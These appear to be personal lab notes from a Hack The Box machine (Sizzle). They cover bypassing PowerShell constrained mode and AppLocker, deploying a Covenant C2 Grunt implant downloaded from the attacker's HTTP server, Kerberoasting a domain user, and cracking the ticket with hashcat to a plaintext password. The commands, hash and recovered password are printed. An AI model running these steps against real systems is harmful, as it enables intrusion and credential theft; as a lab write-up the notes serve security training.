
```
 $ExecutionContext.SessionState.LanguageMode
```
![[Pasted image 20240411235342.png]]

```
Constrained Language Mode
```

So let's see how to bypass it to get the full access.

So if a group policy is restricting us from executing a program will simply bypass it using AppLocker bypass list.

https://github.com/api0cradle/UltimateAppLockerByPassList

![[Pasted image 20240412082454.png]]

Always keep in mind that in these situation these location are whitelisted means we might have write permissions in this.
```
C:\Windows\Temp
```


Will install a C2 framework (i.e. [Covenant](https://github.com/cobbr/Covenant))
Clone the repository
```
git clone --recurse-submodules https://github.com/cobbr/Covenant
```

```
cd Covenant/Covenant
```

```
 docker build -t covenant .
```

I don't have docker so we have to install it as well

```
sudo apt install docker.io
```

```
sudo apt install docker-compose
```

![[Pasted image 20240412091251.png]]

```
docker run -it -p 7443:7443 -p 80:80 -p 443:443 --name covenant -v $(pwd)/Data:/app/Data covenant --username singh
```

```
testing123
```

![[Pasted image 20240412101938.png]]

We have installed Convenant in no time with the help of docker.

These both things are virtually the same (i.e. Covenant is server aspects and elite is the client that connects to the server)

I tried installing Elite but it's deprecated Temporarily.

```
docker ps -a
```

```
docker rm covenant
```


![[Pasted image 20240429211001.png]]

Will go in Launchers and select Binary
![[Pasted image 20240429211101.png]]

Will click on generate
![[Pasted image 20240429211518.png]]

Will Login to the PS shell and will upload our luncher file and try to run it and see if we get a connection or not.

I simply hosted a python3 server and downloaded the file simply
```
 python3 -m http.server 8080
```
![[Pasted image 20240429212547.png]]

```
IWR -Uri http://10.10.16.20:8080/GruntHTTP.exe -OutFile pleasesub.exe
```
![[Pasted image 20240429212509.png]]

Grunt
```
help
```
![[Pasted image 20240429212708.png]]

We have different commands like Rubeus , Seat Belt
![[Pasted image 20240429212821.png]]

Will simply see the video as we already how to run bloodhound and see things as we are getting with our but learnt the method

![[Pasted image 20240501014332.png]]

![[Pasted image 20240501014433.png]]

As we have both the rights we can simply attempt DCSync attack.

```
MRLKY@HTB.LOCAL
```

![[Pasted image 20240501015405.png]]


I have copied the format required to run the Kerberoasting and it should be local administrator and our requirement is fulfilled so that we can the ticket hopefully.

```
kerberoast mrlky bceef4f6fe9c026d1d8dec8dce48adef
```

```
$krb5tgs$23$*mrlky$HTB$http/sizzle$E6AB6546D0040C5A346BAA384A47513C$A1EE48B280FFF0FEF9D238DF24C27ED6911C3791B0D3158A11AF1422E21338ED640B85752F71E618D2C79FEDDA7C6A7B07A13629C3A7EDF9B16249341B534CC53D6E6DD0ED3E33AFC95B24E6E1FB6ECDEC3F30AB07D0A2E6AC85B84206653F2CE22961CBF85F0B497CCB6048E0EA431DAC35C54BB404E8030B278CD2CD8CA821CC18110CF05E410F69E79A3AD52609CB55834D22D799D776D5A9FE49F7D825B14933B427CBCC29465C7A54AE1F7BBDDDFCE6A5A7BFD21270A19A541605CD713649BD54A64B76036B802ED3EF2EC7770502CBA3BE284569C85B415D3230384ABCEEF3A71556E2279D289FBB37EBB41BE5AF791D1B9A8BF900558963651A8B14B93FF77721EBDFA94B965D716BAAFA8269FC8BCA50F32A7040A24D96FC1A88F4BEE491734023AF2D6C1C3E9661F80441C55308A906099E2C12C5B54BB33AE79E2F0A82370F6A37D2E43A1E13845C8F741569E6031015B19D17BB20E7187E23C3A5A15BBC75D9D0A9B244521580D372B3F8B87548452746EF6F28966497BFB65B5F927B3F981E7E091CE32F58E1A4D67AFCCFEE8E6C1873F270CAE17437679303D1CB7291663A4B344A2868B27671EC419B204F1F09E481906D70F1C4DCF2C8C4985A44EB9D10F5226F45166778DB11FB5286C7904169FC487E2047994627009585328EFA0E32029F6D4648C5DDD523B676897398E43D5954415DCD6BDA20DD560B8FCB99AA5AD03C30FB0C34FB83F6E5555E93C74330F1DE98C5DFCE772D6BAF405E0CEE62506974B65A35939DBE3DD50E68A0B7E88F43B82F410DCE7BE760433C5AE63D3B3AE723B835D9768DAB16C105F0C90CAED4D02456FEF07390587341ECA587CD47799A29ECA8B9041F4E088BDB8E64A8CD59DA816A603CE820923F583472347BFB9A2D2A6FD034C28F869B334FCF4A23E0844A18BFF31456BA1FDB5F5D7D2F2C0BB2A4BAC72FCB8CF598AB870E2DEDE00BF00870604B95BFA65C1F58CBE94858A4258DEFAE6D57D857E1C4B925B88A133004DBE9FAD06E76D7C1E012572E140D3D975DADC7A6FA1A30712C381B295FB52F11424CD63C3D8023A11502C043F3F3971C491A6C7ECA1F56E6307FB7E7EC98BE2560E481154C9CE070D334EAD291557B6AFEE1E4EF35366D22B7658A898B876F0268EB1099EACC4A591C0836906E4CC63792AA27A875E4F4C811CB5E12B7161EF6EB5C7D752D0D15402C67C4F44354E032D4768FF2D45BB9B19A276B468F59CBA36F62D411DC5AD5674A85E8EA8F0057D8F93414C0A85C6C5B551F71A5B8BE51E1FC02AC2EE7CFB1E52AC4322626305490BD22E1EE4AB3B2E1F641396552B19C68BF178386ADDCAF673C1D10226B32E0E49639650E6BE0D7162DFCBD881BAE9400C0D9DEA323AF14447F2974A30A
```

![[Pasted image 20240501020438.png]]

I learnt something new using c2c control how to get Kerberoasting ticket.

https://hashcat.net/wiki/doku.php?id=example_hashes
![[Pasted image 20240501020755.png]]

So we are getting separator unmatched which means there is something mission and in this case it was the astrik before the $
![[Pasted image 20240501021325.png]]

![[Pasted image 20240501021504.png]]
I don't know that asterisk mark was on purpose so that we should got this error and solve it.

```
 .\hashcat.exe -m 13100 -D 2 .\hashes4.txt .\rockyou.txt -O
```

![[Pasted image 20240501021739.png]]

```
Football#7
```

